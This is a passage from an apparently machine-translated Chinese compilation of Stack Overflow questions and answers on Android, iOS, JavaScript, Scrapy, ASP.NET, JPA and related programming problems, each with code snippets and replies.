        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-09-02T08:49:45.687

而不是使用 grid.dataset.getSize()，而是使用下面的代码片段来获取网格中存在的数据长度，如果它是 0，您可以打印所需的消息。

//所有数据都存在于 sigma 网格中

var allSelectedRecords = myGrid.dataset.data;

//这将给出sigma网格中存在的行数

allSelectedRecords.length;

# android - 从本机代码在 android 设备屏幕上显示 rgb888 数据

> ID：14847330
> 
> 赞同：1
> 
> 时间：2013-02-13T05:57:18.607
> 
> 标签：android, opencv, image-processing, android-ndk

这是一个我认为只有在android-ndk中彻底工作过的人才能回答的问题。

**问题：**我编写了一个使用文件资源管理器读取输入文件的应用程序。然后当**按下解码和播放按钮**时，应用程序应解码编码的输入文件并将其显示在设备屏幕上。这里的问题是解码是在本机代码中执行的。解码是正确的，因为我将它转储到 sdcard 并使用原始视频播放器验证它。解码帧为 RGB888 格式，数据类型为**unsigned char**。因此，如果有人知道如何显示本机代码中的数据，请提供一些有关相同的建议。

**我尝试过：**首先我将帧缓冲区返回给调用本机代码的函数，然后我将帧缓冲区转换为 char 数组，并将该数组作为 java 对象（即 jcharArray）返回给我的活动。在我的活动中，我将 char 数组转换为 int 数组，并使用 setpixels() 函数将此数组分配给位图。然后使用画布将这个框架绘制到设备屏幕上。应用程序是如何崩溃的，主要是每次解码帧时控件似乎都不会返回到 java 活动。此外，即使这种技术有效，显示的帧也会很慢，以至于它永远不会看起来像视频。

所以我恳请你们提供建议和任何技术来做同样的事情。先谢谢了。。。等待回复。。。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-23T04:54:35.677

听起来您在 Java 中完成了大部分工作，并且只想将位图数据从 JNI 传递到 Java。（替代方法包括使用 OpenGL ES 从 JNI 端进行绘制。）如果是这种情况，请查看[`<android/bitmap.h>`](http://mobilepearls.com/labs/native-android-api/include/android/bitmap.h)标题，这将要求您链接到 jnigraphics 库 ( `-ljnigraphics`)。

基本上，您执行以下操作：

1.  在 Java 端创建一个`android.graphics.Bitmap`适当的帧大小和数据类型，并将其传递给您的 JNI 代码
2.  在接收 JNI 代码中，调用`AndroidBitmap_lockPixels()`，将数据复制到使用`memcpy()`或等效的结果指针中，使用 解锁位图`AndroidBitmap_unlockPixels()`，然后返回 Java。
3.  回到 Java 端，在其他地方使用位图。

# iphone - 在 ios6 的 mkmapview 中找不到 UIscrollView 作为子视图

> ID：14847333
> 
> 赞同：2
> 
> 时间：2013-02-13T05:57:32.820
> 
> 标签：iphone, ios, objective-c, uiscrollview, mkmapview

我正在尝试在 mkmapview 中获取 UIScrollView。在 iOS 5 中，我的代码运行良好，但在 iOS 6 中应用程序崩溃了。我需要滚动视图来设置 mkmapview 中的缩放级别。

当我在 iOS5 中运行我的应用程序时，它给了我滚动视图，但在 iOS 6 中它返回 MKSCrollContainerView

这是我的代码。

```
UIScrollView *scroll = [[[[mapView subviews] objectAtIndex:0] subviews] objectAtIndex:0];
[scroll setZoomScale:0.045551 animated:NO]; 
```

# javascript - iframe 中的窗口对象

> ID：14847341
> 
> 赞同：3
> 
> 时间：2013-02-13T05:57:53.433
> 
> 标签：javascript, html, iframe, window-object

如果我有一个从外部域加载页面的 iframe，并且该外部页面具有访问 Window 对象的 javascript 代码，那会破坏该 javascript 的执行吗？我的意思是脚本会像在普通窗口中一样被执行，还是 iframe 会停止执行。

基本上，外部域有一个设置窗口属性的 javascript 代码。那么在 iframe 中会发生什么？

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:08:46.587

当 iframed js 执行时，它是在 iframe 的上下文中执行的，它是它的窗口。要访问浏览器窗口，请执行`window.parent`

# xpages - 电子邮件中格式化的 Xpages 富文本字段

> ID：14847356
> 
> 赞同：-1
> 
> 时间：2013-02-13T05:59:24.457
> 
> 标签：xpages

我有一个 Xpage，其中一个按钮会触发一个电子邮件对话框。我有一个富文本控件。现在，当我在富文本控件中输入一些文本并将字体颜色格式化为 "Red" 时。当我发送电子邮件时，我在接收端注意到字体颜色不是“红色”。它的颜色是“黑色”。发送按钮后面的代码会创建一个临时的“备忘录”后端 Notes 文档，并从前端获取所有信息。富文本控件内容作为 MIME 检索，然后转换为 RT。我实际上在转换为 RT 后保存了后端注释文档。我发现这是最终用户没有收到所需颜色的消息的原因。但我必须保存后端文档以将文件附加（嵌入）到富文本中。有人可以说为什么会这样吗？以及对此的任何解决方案或想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T09:38:25.787

改用其中一种方式发送 html 电子邮件

[http://openntf.org/XSnippets.nsf/snippet.xsp?id=create-html-mails-in-ssjs-using-mime](http://openntf.org/XSnippets.nsf/snippet.xsp?id=create-html-mails-in-ssjs-using-mime)

或者

[http://openntf.org/XSnippets.nsf/snippet.xsp?id=emailbean-send-dominodocument-html-emails-cw-embedded-images-attachments-custom-headerfooter](http://openntf.org/XSnippets.nsf/snippet.xsp?id=emailbean-send-dominodocument-html-emails-cw-embedded-images-attachments-custom-headerfooter) 当您发送 HTML 电子邮件时

我想你会得到一个更好的结果。

# mdns - 如何在 mDNS 中发现子类型

> ID：14847357
> 
> 赞同：0
> 
> 时间：2013-02-13T05:59:34.137
> 
> 标签：mdns

我正在尝试根据子类型进行发现。例如：如果我使用 avahi-publish 注册服务，

avahi-publish -s --domain="local" --subtype="_annon._sub._http._tcp" "ServiceName" "_http._tcp" 80 "TxtRecord=Some Text"

*我需要根据子类型“_annon._sub”进行服务发现。有没有办法做到这一点？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:02:20.633

您可以使用 linux 命令 dig 来查询：

```
dig txt _annon._sub._http._tcp +short 
```

# python - Scrapy：已抓取但未抓取

> ID：14847366
> 
> 赞同：4
> 
> 时间：2013-02-13T06:00:48.703
> 
> 标签：python, scrapy, web-crawler

通过提供的建议和大量线索，我能够完成单页的抓取工作。现在，我尝试对代码进行更改，以实现多个规则，但结果看起来并不好。这是我正在尝试做的简要说明，

对于 start_url=ttp://sfbay.craigslist.org/ - 我使用 parse_items_1 来识别[http://sfbay.craigslist.org/npo](http://sfbay.craigslist.org/npo)并解析它来识别链接

在第 2 级中，对于 ttp://sfbay.craigslist.org/npo 中的链接，我需要使用 parse_items_2 来识别[http://sfbay.craigslist.org/npo/index100.html](http://sfbay.craigslist.org/npo/index100.html)之类的链接并对其进行解析。

蜘蛛能够爬行（我可以看到显示），但链接没有被废弃。

```
2013-02-13 11:23:55+0530 [craigs] DEBUG: Crawled (200) <GET http://sfbay.craigslist.org/npo/index100.html> (referer: http://sfbay.craigslist.org/npo/)
('**parse_items_2:', [u'Development Associate'], [u'http://sfbay.craigslist.org/eby/npo/3610841951.html'])
('**parse_items_2:', [u'Resource Development Assistant'], [u'http://sfbay.craigslist.org/eby/npo/3610835088.html']) 
```

但是链接和标题在报废时为空。

```
2013-02-13 11:23:55+0530 [craigs] DEBUG: Scraped from <200 http://sfbay.craigslist.org/npo/index100.html>
{'link': [], 'title': []}
2013-02-13 11:23:55+0530 [craigs] DEBUG: Scraped from <200 http://sfbay.craigslist.org/npo/index100.html>
{'link': [], 'title': []} 
```

代码详情：

```
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.selector import HtmlXPathSelector
from myspider.items import CraigslistSampleItem

class MySpider(CrawlSpider):
    name = "craigs"
    allowed_domains = ["sfbay.craigslist.org"]
    start_urls = ["http://sfbay.craigslist.org/"]

    rules = (
        Rule(SgmlLinkExtractor(allow=("index\d00\.html")), callback="parse_items_2", follow= True),
        Rule(SgmlLinkExtractor(allow=(r'sfbay.craigslist.org/npo')), callback="parse_items_1", follow= True),
        )

    def __init__(self, *a, **kw):
        super(MySpider, self).__init__(*a, **kw)
        self.items = []
        self.item = CraigslistSampleItem()

    def parse_items_1(self, response):
#       print response.url
        hxs = HtmlXPathSelector(response)
        titles = hxs.select("//div")
        for title in titles:
            self.item ["title"] = title.select("//li/a/text()").extract()
            self.item ["link"] = title.select("//li/a/@href").extract()
            print ('**parse-items_1:', self.item["title"])
            self.items.append(self.item)
        return self.items

    def parse_items_2(self, response):
#       print response.url
        hxs = HtmlXPathSelector(response)
        titles = hxs.select("//p")
        for title in titles:
            self.item ["title"] = title.select("a/text()").extract()
            self.item ["link"] = title.select("a/@href").extract()
            print ('**parse_items_2:', self.item["title"], self.item["link"])
            self.items.append(self.item)
        return self.items 
```

非常感谢任何帮助！

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T17:18:57.027

在 scrapy 教程中，项目在回调中创建，然后返回以进一步向下传递，而不是绑定到蜘蛛类的实例。因此删除 init 部分并重写一些回调代码似乎可以解决问题。

```
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.selector import HtmlXPathSelector
from tutorial.items import CraigslistSampleItem

class MySpider(CrawlSpider):
    name = "craigs"
    allowed_domains = ["sfbay.craigslist.org"]
    start_urls = ["http://sfbay.craigslist.org/"]

    rules = (
        Rule(SgmlLinkExtractor(allow=("index\d00\.html")), callback="parse_items_2", follow= True),
        Rule(SgmlLinkExtractor(allow=(r'sfbay.craigslist.org/npo')), callback="parse_items_1", follow= True),
        )

    def parse_items_1(self, response):
        items = []
        hxs = HtmlXPathSelector(response)
        titles = hxs.select("//div")
        for title in titles:
            item = CraigslistSampleItem()
            item ["title"] = title.select("//li/a/text()").extract()
            item ["link"] = title.select("//li/a/@href").extract()
            print ('**parse-items_1:', item["title"])
            items.append(item)
        return items

    def parse_items_2(self, response):
        hxs = HtmlXPathSelector(response)
        titles = hxs.select("//p")
        items = []
        for title in titles:
            item = CraigslistSampleItem()
            item ["title"] = title.select("a/text()").extract()
            item ["link"] = title.select("a/@href").extract()
            print ('**parse_items_2:', item["title"], item["link"])
            items.append(item)
        return items 
```

为了测试，我将抓取的项目转储到一个文件 ( `scrapy crawl craigs -t json -o items.json`)。我注意到经常有空条目和很多“使用条款”链接。这些表明您的提取 xpath 可以收紧，但除此之外它似乎正在工作。

# php - Java 脚本未提交 Html 表单

> ID：14847368
> 
> 赞同：0
> 
> 时间：2013-02-13T06:00:53.130
> 
> 标签：php, javascript, html

我正在使用以下 javascript 提交表单，但它没有提交。

```
 if(timeup)
        {
         alert("welcome to time up.");
        var id = document.getElementById("test_id").value;
        var no = document.getElementById("noq").value;
      var action = 'result.php?id='+id+'&no='+no+'';

    exercisenew.action = action;
    alert("form"+exercisenew.action);
   exercisenew.submit();
       alert("form submitted.");
    } 
```

完整代码[在这里](http://pastie.org/6148393)。

html格式。

```
<form method="post" action="" id="exercisenew" name="exercisenew"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:05:52.420

```
if(timeup)
{
  alert("welcome to time up.");
  var id = document.getElementById("test_id").value;
  var no = document.getElementById("noq").value;

  //use encodeURIComponent()
  var action = encodeURIComponent('result.php?id='+id+'&no='+no+'');

  //get the form
  var exercisenew = document.getElementById("exercisenew")
  exercisenew.action = action;

  alert("form"+exercisenew.action);
  exercisenew.submit();
  alert("form submitted.");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:04:55.420

为`exercisenew`

```
var exercisenew = document.getElementById("exercisenew") 
```

做你做过的所有事情

# iphone - UITableViewCell 类似于 iPhone 联系人单元格

> ID：14847369
> 
> 赞同：0
> 
> 时间：2013-02-13T06:00:54.927
> 
> 标签：iphone, uitableview

我想以编程方式创建一个`UITableViewCell`类似于我们可以在 iPhone 联系人应用程序中看到的用于输入手机号码的单元格。怎么做？？那条竖线怎么画？

![在此处输入图像描述](../Images/606f5c05de3af2790c8f2d69efdee005.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:08:17.603

![这是它的样子。](../Images/8e980f6fdd11ef52614c33bf53b581bd.png)

您必须创建一个自定义`UITableViewCell`来创建它。在您的自定义`UITableViewCell`中，您必须创建以下内容：

1.  单元格的背景图像。它可以是背景图像（包括圆角和分隔线），也可以`UIView`通过圆角创建效果。黄色盒子。
2.  `UILable`显示文本“移动”。红色盒子。
3.  `UITextField`带有占位符“电话”。橙色盒子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:08:48.910

`UITableViewCell`使用您自己的实现自定义。取一个`UItableViewCell`子类`View`并在其中绘制/添加您的实现。

# highcharts - Highcharts：堆叠列xAxis自动“压缩”

> ID：14847374
> 
> 赞同：0
> 
> 时间：2013-02-13T06:01:22.613
> 
> 标签：highcharts, jsfiddle

我有一个包含两个系列的堆叠柱 Highchart。xAxis 填充、最小值和最大值正是我想要的。jsFiddle在这里：http: [//jsfiddle.net/BobTheZealot/MBmu7/#base](http://jsfiddle.net/BobTheZealot/MBmu7/#base)

感兴趣的系列是第二个系列，它只有一个数据点：

```
data: [{
        x: 1767157200000,
        y: 95746
    } 
```

但是，如果我在第二个系列中添加另一个数据点（x 是 2014 年的新点，正好在前一个最小值和最大值之内），xAxis 突然“压缩”：轴的任一侧都有额外的填充，并且轴上还有两个标签（2010 和 2028）。

```
data: [{
        x: 1420002000000,
        y: -95100
    }, {
        x: 1767157200000,
        y: 95746
    }] 
```

jsFiddle：http: [//jsfiddle.net/BobTheZealot/MBmu7/13/](http://jsfiddle.net/BobTheZealot/MBmu7/13/)

为什么 xAxis 被重新格式化？我怎样才能让它看起来像在第一个 jsFiddle 中一样？

奇怪的是，如果我翻转第二个系列的数据点的顺序，使它们按 x 值的降序排列（这看起来很奇怪；第一个系列的数据按 x 值的升序排列），那么 xAxis 格式不会改变（即，不“压缩”）。

```
data: [{
        x: 1767157200000,
        y: 95746
    }, {
        x: 1420002000000,
        y: -95100
    } 
```

jsFiddle 上一个 jsFiddle 链接的第 14 版（显然不能发布三个链接）。

被困在这几天了，所以非常欢迎任何帮助！谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:09:18.990

原因是点之间的时间跨度。如果您知道点之间的 ~interval 是什么，您可以设置`pointRange`，请参阅：http: [//jsfiddle.net/MBmu7/15/](http://jsfiddle.net/MBmu7/15/)否则它将采用 1767157200000 - 1672462800000 作为点之间的距离并相应地格式化 xAxis。

# xpath - 评估 XPath 2.0 表达式的程序/工具

> ID：14847375
> 
> 赞同：1
> 
> 时间：2013-02-13T06:01:27.523
> 
> 标签：xpath, xpath-2.0, xmlstarlet

xmlstarlet 可用于评估 xpath 1.0 表达式。但它不支持 XPath 2.0 表达式。可以使用什么程序/工具来评估 XPath 2.0 表达式？最好用 C 写的东西？很像 xmlstarlet？

感谢期待。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T16:26:31.847

遗憾的是，XPath 2.0 处理器确实短缺，尤其是在 C 语言中。但是 XQuery 是 XPath 2.0 的超集，并且周围有很多 XQuery 处理器，包括应该在您的环境中工作的处理器。（但我不够熟悉，无法推荐一个。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T17:04:11.227

我写了一个[XPath 2 / XQuery 1.0 解释器](http://videlibri.sourceforge.net/xidel.html)。虽然是Pascal，不是C，但是你可以像xmlstarlet一样在cli上调用它，或者在网站上测试一下。

支持除 XML 模式之外的所有内容，但可能会尝试评估一些不正确的输入，而不是拒绝它们。（但在默认的 XPath 2 模式下，它将拒绝所有包含 XQuery 表达式的输入）。它还有一些语法扩展，比如对象、模式匹配、...（都可以关闭）

# c# - 如果用户会话在服务器上过期，用户应该从应用程序中注销

> ID：14847377
> 
> 赞同：0
> 
> 时间：2013-02-13T06:01:34.957
> 
> 标签：c#, asp.net, asp.net-mvc-3, session, session-state

我正在开发 Asp.net MVC 3 应用程序，其中我有一种在帐户控制器中注销的方法。

```
 public ActionResult LogOff()
        {
            try
            {
               // Session.User = null;

                this._authenticationService.SignOut();

                return RedirectToAction("Login", "Account");
            }
            catch (Exception e)
            {

                return View("Error");
            }
        } 
```

我想从 global.asax.cs 中的 Session_End 方法调用此方法，或者是否有任何其他方法可以`RedirectToAction("Login", "Account");`从 global.asax.cs 文件中调用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T09:45:54.683

我不知道您是否可以在当前项目中使用 signalr，但如果可以，如果会话过期，您可以使用 signalr 在客户端调用重定向。

服务器端类似的东西：

```
protected void Session_End()
{
    GlobalHost.ConnectionManager.GetHubContext<ConnectionStateHub>().Clients[{yourClientsId}].SessionExpired({yourRedirectTarget});
} 
```

在客户端，类似以下的内容可以进行重定向：

```
var sessionHub = $.connection.sessionHub;
sessionHub.sessionExpired = function(target) { window.location = target; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:31:01.150

“Session_End”不对应任何请求或任何请求流，因此重定向/执行控制器操作不会将 HTML 返回到浏览器。只要浏览器向服务器发出请求，几乎没有机会执行“Session_End”。可能您可以使用存储在会话中的对象，当会话结束时，该对象将从会话存储中丢弃。

在 Begin_Request 事件或 MVC 中的全局过滤器中编写通用代码可以检查该对象的存在，并可以在需要时重定向用户以注销操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:20:52.630

您需要使用基于 Ajax+JavaScript 的解决方案，只需检查可以帮助您的类似线程：

[ASP.Net 中的客户端会话超时重定向](https://stackoverflow.com/questions/2852121/client-side-session-timeout-redirect-in-asp-net)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:21:06.687

在 Global.asax.cs 文件中尝试这样的操作：

```
protected void Session_End()
    {
        // Clear the error on server. 
        Server.ClearError(); 
        Response.Clear(); 

        RouteData routeData = new RouteData(); 

        routeData.Values.Add("controller", "Account"); 
        routeData.Values.Add("action", "Login"); 

        // Call target Controller and pass the routeData. 
        IController AccountMainController = new AccountController(); 
        AccountMainController.Execute(new RequestContext( 
                new HttpContextWrapper(Context), routeData));
    } 
```

# php - 提交后动态隐藏表单，所有用户

> ID：14847378
> 
> 赞同：0
> 
> 时间：2013-02-13T06:01:39.147
> 
> 标签：php, javascript, html, css

我有一个挑战，我将很快开始工作。我需要在用户提交他们的电子邮件地址后动态隐藏一个表单，并且在该事件之后对该表单隐藏所有其他访问者。我能找到的最接近的东西是在下面的链接中：

[提交时动态隐藏表单？](https://stackoverflow.com/questions/656082/dynamically-hide-form-on-submit)

访问者将输入他们的电子邮件地址来申请比赛中的 26 个位置之一，我不希望每个提交表单都有多个参赛者。

让我知道我是否可以进一步澄清。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:08:22.207

该页面应该是动态生成的，这样只有在收集到的电子邮件少于 26 封时才会呈现表单。

每当提交表单时，您应该检查您收集了多少，如果少于 26，则存储用户的电子邮件。

否则，如果用户提交表单（因为他在收集 26 封电子邮件之前加载了他的页面），则处理提交但检查您到目前为止收集了多少，并通知用户他为时已晚。

如果您想走得更远，您可以在每个呈现的页面上包含一个 Ajax 轮询功能，该功能不断检查服务器以查看收集了多少电子邮件，一旦达到 26，您可以自动从 DOM 中删除表单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:08:36.977

您需要有一个后台循环来轮询您的服务器以查看是否有任何剩余的可用插槽。一旦该计数器达到零，您将隐藏表单并将其替换为另一条消息。

触发 AJAX 脚本加载的标准 JavaScript 计时器就足够了。

# c# - 如何在c#中使用本地IP地址访问本地事件日志

> ID：14847380
> 
> 赞同：1
> 
> 时间：2013-02-13T06:02:00.647
> 
> 标签：c#, wmi, event-viewer

我可以使用“.”访问本地系统事件日志信息。和“机器名”。但我无法使用 IP 地址访问本地系统事件日志。

代码是：

```
EventLog Logs = new EventLog("Application",".");//EventLog("Application","Machinename"); 
```

这也很好用。但是当我将它用于IP地址时

```
EventLog Logs = new EventLog("Application","XXX.XX.X.X"); 
```

请帮我解决这个问题。

提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:10:55.807

尝试使用以下命令将 IP 地址转换为主机名`Dns.GetHostEntry`：

```
using System.Net;

string hostName = Dns.GetHostEntry("xxx.xx.x.x").HostName.Split('.')[0];
    EventLog log = new EventLog("Application", hostName); 
```

# javascript - JavaScript Isotope - 如何管理动态数据集（重新初始化 Isotope）

> ID：14847381
> 
> 赞同：1
> 
> 时间：2013-02-13T06:02:02.007
> 
> 标签：javascript, css, dynamic, jquery-isotope

我想设计一个网站，以`Isotope`外观显示简单的搜索结果。我有一个文本输入并从用户那里获取查询并从我的服务器检索搜索结果。因此，通过更改查询，我的数据和过滤选项会发生变化。我不知道如何使用`Isotope`.

每次查询和数据更改后，当我在 中设置新的同位素属性和过滤器时`$container.isotope`，数据块变得不可见，并且`Isotope`动画和过滤等功能不再起作用。

有人知道如何使用同位素管理动态数据集吗？以及如何在更改数据集（数据块）后重新设置（重新初始化）同位素设置？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T19:06:26.247

我自己找到了答案！我们可以使用同位素的插入和删除功能。 [http://isotope.metafizzy.co/docs/adding-items.html](http://isotope.metafizzy.co/docs/adding-items.html)

# java - java.lang.OutOfMemoryError 使用 JPA 循环遍历大表时

> ID：14847393
> 
> 赞同：2
> 
> 时间：2013-02-13T06:02:47.013
> 
> 标签：java, jpa, playframework

```
List<Picture> pictures = Picture.findAll(); //Around 2GB of data (uses JPA/play framework)

for (Picture picture : pictures) {
  byte[] b = picture.image.data; //Image raw data is stored in a different table than Picture table
  System.out.println(picture.file_name + " " + b.length);
} 
```

上面的代码`java.lang.OutOfMemoryError`在运行时会导致错误，因为图片存储在数据库中，而不是数据库中的文件引用。

一旦对象完成处理，我是否可以“刷新”内存？我试过了`picture.em().flush()`，`Iterator.remove(), System.gc()`没有奏效。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-14T01:19:01.440

似乎我找到了解决方案。每张图片后清除实体管理器。

```
List<Picture> pictures = Picture.findAll();
for(int i=0;i<pictures.size();i++) {
   Picture picture = Picture.findById(pictures.get(i).id);
   byte[] b = picture.image.data; 
   System.out.println(picture.file_name + " " + b.length);
   //Do extra stuff with image data

   picture.em().clear(); //clear JPA entity manager
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:12:35.257

尝试创建文件名列表而不是图片，例如：

```
List<string> picturefiles = Picture.*findAllFilenames*(); //Around 2GB of data (uses JPA/play framework)

for (String picturefile : picturefiles ) {
  picture  o = new picture(picturefile)
  byte[] b = picture.image.data; //Image raw data is stored in a different table than Picture table
  System.out.println(picture.file_name + " " + b.length);
} 
```

# algorithm - GCD - 欧几里得算法和分解算法分析

> ID：14847397
> 
> 赞同：0
> 
> 时间：2013-02-13T06:02:51.630
> 
> 标签：algorithm, complexity-theory, big-o, analysis

当我准备介绍算法课中期时，我正在通过教授之前发布的一些测试，我发现了这个问题：

计算 gcd(312,455) 的方法有两种：找到每个数字的因式分解，以及使用欧几里得算法。每种方法的复杂性是多少？

他的回答是：

```
gcd(455,312) = gcd(312,143) = gcd(143,26) = gcd(26,13) = gcd(13,0) = 13

factors(312)= {2, 3, 13} factors(455)= {5, 7, 13} 
```

复杂性：

*   gcd -`log(n)`
*   因素——`sqrt(n)`

他是如何理解复杂性的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-01T20:29:55.040

要分析欧几里得 GCD，您必须选择最坏情况的值：我个人发现斐波那契对最适合这个问题。例如

```
EGCD(121393, 75025) = 1; // With 24 iterations (or recursive calls). 
```

看看这个“序列”：

![在此处输入图像描述](../Images/bada7c433507f188fe478da9a651f105.png)

对于斐波那契对，我们注意到：

```
121393 % 75025 == 121393 - 75025 == 46368. 
```

因此，有一个递减因子`121393 / 46368 = **2.61** (more or less);`

当然，最坏情况下的运行时间会使用 Small Oh Notation，因为最好情况下会使用 Omega(1)，换句话说，Constant Time，例如，当除数为 1000 而除数为 2 时。

由于我们有一个递减因子，我们可以将递归关系如下所示：

![在此处输入图像描述](../Images/bb250b13251a0b86a79a0835ca1f03cc.png)

您必须知道，此运行时间与 EGCD 算法的迭代版本完全相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T19:39:15.543

给定的复杂性是所需算术运算数量的粗略最坏情况界限：

*   欧几里得算法：因为`a >= b`我们有`gcd(a,b) = gcd(b, a mod b)`where `min(b, a mod b) < a/2`，所以在最多两个归约步骤之后，我们至少将第一个操作数归约`1/2`。因此，减少步骤的数量受`a`与基础的对数约束，该对数`sqrt(2)`适用`c * log(a)`于某个常数`c`。

*   因式分解：为了测试数字的素数或分解素数的平方，只需检查直到数字平方根的因数。如果给定数字的因子更小，那么我们需要更少的可分性测试。因此，所需的除法数很容易受 约束`sqrt(a)+sqrt(b)`。由于最多可以有 的`ld(a)`因子，`a`并且`ld(a) < sqrt(a)`剩余的比较和乘法得到 gcd 也受`sqrt(a)`.

# iphone - UITableViewCell 中的多个复选框

> ID：14847399
> 
> 赞同：0
> 
> 时间：2013-02-13T06:03:07.073
> 
> 标签：iphone, uitableview, checkbox, xcode4.5

我需要在每个`UITableViewCell`. 如果只有一个复选框并且我们检查状态，我知道该怎么做。但是当我选择多个复选框时，复选框状态没有正确。当我单击它两次时，我可以选中复选框。

```
-(IBAction)checkboxClicked:(id)sender
{

    NSIndexPath *indexPath = [self.tableView indexPathForCell:(UITableViewCell *)
                              [[sender superview] superview]];
    NSLog(@"The section  is %d",  indexPath.section);
    UITableViewCell *cell = [self.tableView cellForRowAtIndexPath:indexPath];
    NSMutableArray *cellSection = [self.array objectAtIndex:indexPath.section];
    int tagID=[sender tag];

    int divnum=0;
    if(tagID<100)
        divnum=10;
    else
        divnum=100;
    int section=[sender tag]/divnum;
    section-=1;
    int itemId=[sender tag]%divnum;

    if(itemId==selectedrowforCheckBox)
    {

        if(self.isChecked ==NO)
        {
            self.isChecked =YES;
            [sender setImage:[UIImage imageNamed:@"checkbox_checked.png"] forState:UIControlStateNormal];

            NSNumber* xWrapped = [NSNumber numberWithInt:itemId];
            int m=[cellSection count]-1;
            NSString *questionId=[[cellSection objectAtIndex:m-1]objectForKey:@"QId"];

            NSMutableDictionary *hk=[[NSMutableDictionary alloc]init];
            [hk setObject:xWrapped forKey:@"Ans"];
            [hk setObject:questionId forKey:@"QId"];
            [selectedOptionandQIdArray addObject:hk];
         }
       else
        {
            self.isChecked =NO;
            [sender setImage:[UIImage imageNamed:@"checkbox_unchecked.png"]forState:UIControlStateNormal];

            NSNumber* xWrapped = [NSNumber numberWithInt:itemId];
            int m=[cellSection count]-1;
            NSString *questionId=[[cellSection objectAtIndex:m-1]objectForKey:@"QId"];

            for (int i=0;i<[selectedOptionandQIdArray count];i++)
            {

                NSString *qid=[[selectedOptionandQIdArray objectAtIndex:i]objectForKey:@"QId"];
                if(xWrapped==[[selectedOptionandQIdArray objectAtIndex:i]objectForKey:@"Ans"] && [questionId isEqualToString:qid])
                {

                    NSLog(@"nnd");
                    [selectedOptionandQIdArray removeObjectAtIndex:i];                        
                }
            }
        }
        selectedrowforCheckBox=itemId; 
    }
    else
    {
        if(self.isChecked ==NO)
        {
            self.isChecked =YES;
            [sender setImage:[UIImage imageNamed:@"checkbox_checked.png"] forState:UIControlStateNormal];

            NSNumber* xWrapped = [NSNumber numberWithInt:itemId];
            int m=[cellSection count]-1;
            NSString *questionId=[[cellSection objectAtIndex:m-1]objectForKey:@"QId"];

            NSMutableDictionary *hk=[[NSMutableDictionary alloc]init];
            [hk setObject:xWrapped forKey:@"Ans"];
            [hk setObject:questionId forKey:@"QId"];

            [selectedOptionandQIdArray addObject:hk];

        }
        else
        {
            self.isChecked =NO;
            [sender setImage:[UIImage imageNamed:@"checkbox_unchecked.png"]forState:UIControlStateNormal];
        }
        selectedrowforCheckBox=itemId;
    }
} 
```

我哪里错了？如何处理中的多个复选框`UITableViewCell`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:29:24.923

你试试这个

1 你给标签所有的复选框和行的单元格并在 cellForRowAtIndexPath 上查看 2 并在单击按钮上你尝试像这样编写代码

在您的自定义类中进行按钮操作并调用传递视图标记的父方法

ArrayName = Array 保存给定表的所有数据，实际上它保存了所有视图（在这个数组中，我们保存了显示在单元格上的视图，换句话说，它存储了完整的单元格）

像这样的自定义类方法

```
- (IBAction)button_Action:(UIButton *)sender {
        [parentView Action:self.view.tag BtnTag:sender.tag];
} 
```

在父类

```
 -(void)Remove:(int ) BtnTag  :btnTag
for (int i = 0; i<[ArrayName count]; i++)
{
    customCell *vca=[ArrayName objectAtIndex:i];   
    if(vca.view.tag == viewTag) // here check the cell where we tap or click
    {
         for (UIView* view in [self.view subviews]) {
           if([view isKindOfClass:[UIButton class]]){
                 UIButton *btn = (UIButton*)view; 
                     if(btn.tag == btnTag)
                 NSLog(@"You write this your own code what you want to do "); 
                }
              }

    } 
    }
} 
```

我希望这能解决你的问题

# android - 使用网络空间而不是服务器来托管我的应用程序数据。

> ID：14847401
> 
> 赞同：1
> 
> 时间：2013-02-13T06:03:16.090
> 
> 标签：android

1）我是Java和Android服务器端编程的新手，所以请多多包涵。

2) 我用 BlueHost 购买的网络空间（经销商帐户）和用于在 Android 中托管应用程序数据的服务器之间有区别吗？

3）我已经购买了一些网络空间（经销商帐户）我想知道我是否可以使用这个网络空间来托管我的应用程序数据，比如我想从我的应用程序上传图像并在同一个应用程序中获取相同的图像，一般来说是文本和多媒体。（如果我允许我的应用程序的用户上传数据，如何克服 ftp Uname 和 Password 障碍？）如果是这样，请指导我学习一些初学者教程。

4）我们如何使用XML和JSON进行客户端服务器通信，是否适用于我的情况。教程？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:17:13.900

